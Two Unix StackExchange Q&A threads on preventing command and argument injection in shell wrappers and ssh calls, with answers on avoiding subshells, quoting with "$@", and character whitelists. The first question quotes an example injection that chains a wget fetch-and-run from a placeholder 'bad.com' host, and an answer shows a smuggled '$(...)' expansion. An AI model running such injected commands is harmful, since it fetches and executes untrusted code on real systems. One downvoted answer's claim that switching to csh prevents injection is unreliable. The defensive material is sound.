
##
#
https://unix.stackexchange.com/questions/82643/how-to-prevent-command-injection-through-command-options
#
https://unix.stackexchange.com/questions/355453/how-to-re-write-this-function-to-avoid-argument-injection
#
##

How to prevent command injection through command options?
Asked 11 years, 4 months ago
Modified 2 years, 11 months ago
Viewed 19k times
15

I have an wrapper application where I need to let the user specify custom options to pass to a simulator. However, I want to make sure the user doesn't inject other commands through the user options. What's the best way to accomplish this?

For example.

User provides: -a -b
Application executes: mysim --preset_opt -a -b
However, I don't want this to happen:

User provides: && wget http:\\bad.com\bad_code.sh && .\bad_code.sh
Application executes: mysim --preset_opt && wget http:\\bad.com\bad_code.sh && .\bad_code.sh
Currently, I'm thinking that I could simply surround every user provided option with single quotes ' and strip out any user-provided single quotes, so that the command in the last example would turn out to be a harmless:

mysim -preset_opt '&&' 'wget' 'http:\\bad.com\bad_code.sh' '&&' '.\bad_code.sh'

Note: The mysim command executes as part of a shell script in a docker/lxc container. I'm running Ubuntu.

bashshellsecurityquotingarguments
Share
Improve this question
Follow
edited Jul 11, 2013 at 23:20
Gilles 'SO- stop being evil''s user avatar
Gilles 'SO- stop being evil'
848k199199 gold badges1.8k1.8k silver badges2.3k2.3k bronze badges
asked Jul 11, 2013 at 14:17
Victor L's user avatar
Victor L
41922 gold badges44 silver badges1313 bronze badges
Are you using eval to run the application? If not, the injection should not happen: x="&& echo Doomed" ; echo $x – 
choroba
 CommentedJul 11, 2013 at 14:31 
1
No, I'm not using eval. I'm calling the executable mysim inside a shell script. I am seeing the injection happen if I simply copy the string of options that the user provides and paste it at the end of mysim command. – 
Victor L
 CommentedJul 11, 2013 at 14:49
Does the wrapper application copy and paste the string of options? – 
choroba
 CommentedJul 11, 2013 at 15:36
Yes, the user options come in as a single string, like -a -b. So I'm looking to ensure that additional commands aren't injected in that string. – 
Victor L
 CommentedJul 11, 2013 at 16:21 
1
can you whitelist? only allowing characters [a-zA-Z0-9 _-] looks like a pretty defensive choice. – 
Ulrich Schwarz
 CommentedJul 11, 2013 at 17:17
Show 6 more comments
4 Answers
Sorted by:

Highest score (default)
11

If you have control over the wrapper program, then make sure that it doesn't invoke a subshell. Deep down, an instruction to execute a program consists of the full path (absolute or relative to the current directory) to the executable, and a list of strings to pass as arguments. PATH lookup, whitespace separating arguments, quoting and control operators are all provided by the shell. No shell, no pain.

For example, with a Perl wrapper, use the list form of exec or system. In many languages, call one of the exec or execXXX functions (or unix.exec or whatever it's called) rather than system, or os.spawn with shell=False, or whatever it takes.

If the wrapper is a shell script, use "$@" to pass down the arguments, e.g.

#!/bin/sh
mysim -preset-opt "$@"
If you have no choice and the wrapper program invokes a shell, you'll need to quote the arguments before passing them to the shell. The easy way to quote arguments is to do the following:

In each argument, replace each occurrence of ' (single quote) by the four-character string '\''. (e.g. don't becomes don'\''t)
Add ' at the beginning of each argument and also at the end of each argument. (e.g. from don't, don'\''t becomes 'don'\''t')
Concatenate the results with a space in between.
If you need to do this in a shell wrapper, here's a way.

arguments='-preset-opt'
for x; do
  arguments="$arguments '"
  while case $x in
    *\'*) arguments="$arguments${x%%\'*}'\\''"; x=${x#*\'};;
    *) false;; esac
  do :; done
  arguments="$arguments$x'"
done
(Unfortunately, bash's ${VAR//PATTERN/REPLACEMENT} construct, which should come handy here, requires quirky quoting, and I don't think you can obtain '\'' as the replacement text.)

Share
Improve this answer
Follow
edited Jul 11, 2013 at 23:34
answered Jul 11, 2013 at 23:19
Gilles 'SO- stop being evil''s user avatar
Gilles 'SO- stop being evil'
848k199199 gold badges1.8k1.8k silver badges2.3k2.3k bronze badges
Add a comment
2

You can use Bash's ${VAR//PATTERN/REPLACEMENT} idiom to transform a single quote ' into '\'' by first putting '\'' into a variable (as an intermediate step) and then expanding this variable as the REPLACEMENT element in the mentioned Bash idiom.

# example 
{
str="don't"
escsquote="'\''"
str="'${str//\'/${escsquote}}'"
printf '%s\n' "$str"   #  'don'\''t'
}
Share
Improve this answer
Follow
answered Jul 12, 2013 at 10:38
yalo's user avatar
yalo
2111 bronze badge
Add a comment
0

You may use getopts in bash which can parse the arguments for you, e.g.:

while getopts a:b: opts; do
  case ${opts} in
    a)
      A=${OPTARG}
      ;;
    b)
      B=${OPTARG}
      ;;
  esac
done
Share
Improve this answer
Follow
answered Oct 4, 2015 at 16:24
kenorb's user avatar
kenorb
21.6k1818 gold badges148148 silver badges169169 bronze badges
Add a comment
-1

To avoid injections at best, consider switching to [T]csh. Unlike Bourne Shells, the C Shell is "limited", thus instructing one to take different, safer paths to write scripts. The "limitations" imposed by the C Shell make it one of the most reliable Shells to work with. (E.g: Nesting is minimal to impossible, thus preventing injections at all costs; there are better ways to achieve what one want.)

Share
Improve this answer
Follow
answered Nov 28, 2021 at 20:20
Matheus Garcia's user avatar
Matheus Garcia
4911 silver badge22 bronze badges
2
Downvote but no comment? If downvoting, at least provide a reason. The answer is based upon own practical experience. Unless you have a good reason to, do not downvote, or provide a reason. – 
Matheus Garcia
 CommentedDec 2, 2021 at 17:22
Add a comment



How to re-write this function to avoid argument injection
Asked 7 years, 7 months ago
Modified 7 years, 7 months ago
Viewed 2k times
5

I have a function in my .bashrc file that allows me to run a script on a remote server with arguments via ssh.

Currently, the function contains:

function runMyScript {
    if [ $1 = "s3" ]
    then
        ssh -i "~/path/to/.pem" server.amazonaws.com "/home/ubuntu/scripts/script.sh ${1} ${2} ${3}"
    elif [ $1 = "ec2" ]
    then 
        ssh -i "~/path/to/.pem" server.amazonaws.com "/home/ubuntu/scripts/script.sh ${1} ${2}"
    else
        echo "** Run with s3 or ec2 options"
    fi
}
So, I would be able to call the function, with either runMyScript arg_1 arg_2 arg_3 or runMyScript arg_1 arg_2.

How to re-write this function to make it more secure and avoid possible argument injection?

shellsshsecurityquotingarguments
Share
Improve this question
Follow
edited Apr 2, 2017 at 23:37
Gilles 'SO- stop being evil''s user avatar
Gilles 'SO- stop being evil'
848k199199 gold badges1.8k1.8k silver badges2.3k2.3k bronze badges
asked Apr 2, 2017 at 15:41
cpd's user avatar
cpd
15355 bronze badges
2
What is your threat model? In other words, from what and what exactly are you trying to protect? – 
ddnomad
 CommentedApr 2, 2017 at 16:20
1
Try to remove backticks or dolar signs from the argument strings. – 
Pedro Lacerda
 CommentedApr 2, 2017 at 17:14 
1
Your choice of what arguments to stop/pass will also be influenced by what is your script.sh doing. – 
user218374
 CommentedApr 2, 2017 at 21:25
Add a comment
2 Answers
Sorted by:

Highest score (default)
3

How to avoid possible argument injection?

Find out what sorts of inputs you want to pass through, and make sure the arguments only contain those.

In the least, make sure they don't contain characters special to the remote shell.

$1 is not much of a problem since you compare it against known values. Though you need to double-quote it, otherwise it may expand to multiple words in the comparison, and that may allow passing funny values through it (something like 1 -o x would pass the comparison).

Use if [ "$1" = "s3" ] ; then ... instead.

As for $2 and $3, passing them through ssh is basically the same as passing them to eval or sh -c. Any substitutions inside them will be expanded at the remote.

Say we'll run ssh somehost "echo $var". Now if var contains $(ls -ld /tmp), the remote command line will be echo $(ls -ld /tmp), and the ls is executed on the remote. Double-quoting the variable will not help with command expansion, but single quotes would. With the command written as ssh somehost "echo '$var'", the command expansion does not happen.

Single-quotes inside the variable are still a problem, as they will terminate the single-quoting, so in the least, we'll need to check for that:

case "$var" in *"'"*) echo var has a single-quote; exit 1 ;; esac
Though we might as well check for any special characters we don't want to pass through. Dollar signs start most of the expansions, backticks start command expansion, and quotes I don't trust either:

case "$var" in *[\'\"\$\`]*) echo var has something funny; exit 1 ;; esac
But I'm not sure if that's all, so better just whitelist the characters we want to pass through. If letters, digits, dashes and underscores are enough:

case "$var" in *[!-_a-zA-Z0-9]*) echo var has something funny; exit 1 ;; esac
So, this might be a start:

function runMyScript {
    case "$2" in *[!-_a-zA-Z0-9]*) exit 1 ;; esac
    case "$3" in *[!-_a-zA-Z0-9]*) exit 1 ;; esac

    if [ "$1" = "s3" ] ; then
        ssh somehost "script.sh '$1' '$2' '$3'"
    elif [ "$1" = "ec2" ] ; then 
        ssh somehost "script.sh '$1' '$2'"
    else
        echo "** Run with s3 or ec2 options"
    fi
}
Noting that you used function runMyScript instead of runMyScript(), you're not running a plain POSIX shell. If it happens to be Bash, you could rewrite the pattern matches with the [[...]] test, which supports regular expression matches.

Newish versions of Bash also have the ${var@Q} expansion, which should produce the contents of var quoted in a format that can be reused as input. It might also be of use, but I don't have a new enough bash at hand to test it.

Also, don't blindly trust me to remember all the possible quirks of the shell language.

Share
Improve this answer
Follow
edited Apr 2, 2017 at 18:22
answered Apr 2, 2017 at 18:00
ilkkachu's user avatar
ilkkachu
143k1616 gold badges255255 silver badges426426 bronze badges
Add a comment
3

As a complement to @ikkachu's fine answer:

Compared to passing arbitrary strings to eval or sh -c, the issue is aggravated here by:

the fact that you don't know what shell will be used on the remote host to parse that command line.
What the locale will be, and in particular what charset will be used on the remote host. Whether it's the same as on the local system or not.
Your question is mostly a subset of How to execute an arbitrary simple command over ssh without knowing the login shell of the remote user?

So the answers there will apply here.

In particular if sshd on the remote host allows passing environment variables that start with LC_* (as many openssh deployments do), you can do:

LC_ARG1=$1 LC_ARG2=$2 LC_ARG3=$3 ssh -o SendEnv='LC_*' host exec sh -c \
   \''exec my-script "$LC_ARG1" "$LC_ARG2" "$LC_ARG3"'\'
Sanitizing the input is a good idea, but note that you don't want to use ranges like [A-Z] unless you're in the C locale. For instance, in most GNU system locales, Ǒ is in that range, and for instance in the zh_HK.big5hkscs locale, that character is encoded as 0x88 0x60 and you may recognise 0x60 as the ASCII (and BIG5HKSCS) encoding of the backtick character!

Best is to list the allowed characters individually:

is_safe() case $1 in
  *[!-_.ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz]*) false;;
esac
Also beware of the empty string, which will need to be quoted ('' is supported by all common shells). And beware of arguments starting with - that some tools might take as options.

Share
Improve this answer
